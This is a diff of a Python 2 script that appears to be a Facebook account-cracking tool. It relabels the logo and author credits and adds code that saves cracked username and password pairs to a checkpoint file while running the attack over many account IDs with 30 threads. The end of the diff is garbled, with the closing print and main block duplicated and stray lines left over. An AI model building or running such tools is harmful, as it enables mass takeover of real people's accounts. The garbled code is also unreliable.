@@ -48,18 +48,18 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """ -----------------------------•◈•
-(  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
+\033[0;39m
+\033[0;39m███████╗░██████╗████████╗░█████╗░██████╗░
+\033[0;39m╚════██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
+\033[0;39m░░░░██╔╝╚█████╗░░░░██║░░░███████║██████╔╝
+\033[0;39m░░░██╔╝░░╚═══██╗░░░██║░░░██╔══██║██╔══██╗
+\033[0;39m░░██╔╝░░██████╔╝░░░██║░░░██║░░██║██║░░██║
+\033[0;39m░░╚═╝░░░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92m7StarTricks
+\033[1;96mInstagram \033[1;93m: \033[1;FlowHacker
+\033[1;96mFacebook  \033[1;93m: \033[1; SavenStar
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/7Star786/Khan
 \033[1;91m======================================="""
 
 def tik():
@@ -400,6 +400,30 @@ def pilih_super():
 																	cek = open("out/checkpoint.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
+																	cekpoint.append(user+pass7)
+																	
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print 42*"\033[1;96m="
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
+	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
+	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+	menu()
+
+if __name__ == '__main__':
+	login()
+[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
+	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+	menu()
+
+if __name__ == '__main__':
+	login()
+
 																	cekpoint.append(user+pass7)
 																	
 															
